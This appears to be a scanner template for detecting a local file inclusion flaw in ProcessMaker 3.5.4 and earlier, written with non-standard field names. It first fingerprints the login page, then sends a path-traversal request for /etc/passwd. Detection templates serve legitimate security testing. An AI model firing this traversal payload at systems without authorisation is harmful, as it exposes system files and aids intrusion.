id: processmaker-lfi
brief:
    title: ProcessMaker <=3.5.4 - Local File Inclusion
    by: KrE80r
    level: high
    about: ProcessMaker 3.5.4 and prior is vulnerable to local file inclusion.
    label:
        - processmaker
        - lfi
        - edb
        - vuln
    score: CVSS:7.5
moves:
    - verb: GET
      to:
        - '{{BaseURL}}'
      signs:
        - "on": word
          has:
            - ProcessMaker
            - processmaker_login.png
          in: body
          need: all
    - verb: GET
      to:
        - '{{BaseURL}}/../../../..//etc/passwd'
      signs:
        - "on": status
          status:
            - 200
